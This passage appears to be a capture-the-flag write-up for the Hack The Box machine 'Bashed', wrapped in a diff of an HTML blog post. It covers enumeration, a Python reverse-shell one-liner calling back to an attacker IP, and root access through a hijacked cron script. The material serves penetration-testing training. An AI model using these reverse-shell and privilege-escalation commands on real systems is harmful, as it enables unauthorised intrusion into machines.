@@ -1,0 +1,100 @@
+I"�<ul>
+  <li>Box: Bashed
+    <ul>
+      <li>Difficulty: Easy</li>
+      <li>Points: 20</li>
+      <li>Release: 09 Dec 2017</li>
+      <li>IP: 10.10.10.68</li>
+    </ul>
+  </li>
+</ul>
+
+<p>###Initial Enumeration</p>
+
+<p>####Nmap Scan
+Let’s start with a scan of the target ip address:</p>
+
+<p><code class="highlighter-rouge">nmap -sC -A -oN bashed.nmap 10.10.10.68</code></p>
+
+<ul>
+  <li>-sC:  Default script</li>
+  <li>-A:    Enable OS detection, version detection, script scanning, and traceroute</li>
+  <li>-oN:  Output scan in normal format</li>
+</ul>
+
+<p>The result shows only tcp/80 is open.</p>
+
+<p>####Port 80</p>
+
+<p>Browsing the webpage presents us with a phpbash development page.
+After a quick search of the site, there is nothing that stands out as potentially useful.</p>
+
+<p>The next step would be to investigate if there are any hidden files or directories with GoBuster.</p>
+
+<p>####GoBuster Directory Search</p>
+
+<p><code class="highlighter-rouge">gobuster dir -u http://10.10.10.68 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php</code></p>
+
+<p>Navigate to /dev
+<img src="/images/posts/htb/bashed/bashed2.jpg" /></p>
+
+<p>####Get user.txt
+A simple <code class="highlighter-rouge">cat</code> of the home directory of “arrexel” shows the user.txt flag.</p>
+
+<p><img src="/images/posts/htb/bashed/bashed3.jpg" /></p>
+
+<h3 id="5-get-reverse-shell">5. Get Reverse Shell</h3>
+
+<p>Run a netcat listener on your attacker box:
+<code class="highlighter-rouge">nc -nlvp 4444</code></p>
+
+<p>To get a reverse shell, you can use the following python command:</p>
+
+<p><code class="highlighter-rouge">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  </code></p>
+
+<p>Run that and you should get a reverse shell call as such:
+<img src="/images/posts/htb/bashed4.jpg" /></p>
+
+<p>Checking the <code class="highlighter-rouge">whoami</code>, we see that we’re running as “www-data”. Run the below to pop a full shell:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code></li>
+  <li>Press <code class="highlighter-rouge">Ctrl + Z</code> (to pause)</li>
+  <li><code class="highlighter-rouge">stty raw -echo</code></li>
+  <li><code class="highlighter-rouge">fg</code> (to un-pause)</li>
+  <li><code class="highlighter-rouge">nc -nvlp 4444</code></li>
+</ul>
+
+<p><img src="/images/posts/htb/bashed/bashed5.jpg" /></p>
+
+<p>###Privilege Escalation</p>
+
+<p>####Misconfigured Sudo Permissions</p>
+
+<p>We check what the current user can run as sudo. We can see www-data can run all commands as scriptmanager without the need for a password.</p>
+
+<p><code class="highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/images/posts/htb/bashed/bashed6.jpg" /></p>
+
+<p>Looking through the directories manually we see a folder named <strong>/scripts</strong> which is owned by <strong>scriptmanager</strong>.
+So lets run <code class="highlighter-rouge">sudo -u scriptmanager /bin/bash</code> to spawn a bash shell and give full read/write access to the <strong>/scripts</strong> folder</p>
+
+<p>####Cronjobs &amp; test.py script file</p>
+
+<p>The file named <strong>test.py</strong> looks to be executed every minute based on the timestamp of <strong>test.txt</strong>. We can see the text file is owned by root so it is safe to presume that it is run as a root cron job.</p>
+
+<p>Let’s just edit the <strong>test.py</strong> or create a new python file in <strong>/scripts</strong> to grab a shell as we know root will execute the contents of <strong>scripts</strong>.</p>
+
+<p>I used one of the various reverse shells listed <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a> and moved this file into the <strong>/scripts</strong> directory.
+<code class="highlighter-rouge">cp /tmp/reverseshell.py &gt; /scripts/test.py</code>
+Set up a listener and wait for a second.
+And we got a connection as root.</p>
+
+<p><strong>Go ahead and cat the root flag under the root directory</strong></p>
+
+<p><img src="/images/posts/htb/bashed/bashed7.jpg" /></p>
+
+<p><code class="highlighter-rouge">cat root.txt</code>
+<img src="/images/posts/htb/bashed/bashed8.jpg" /></p>
+:ET
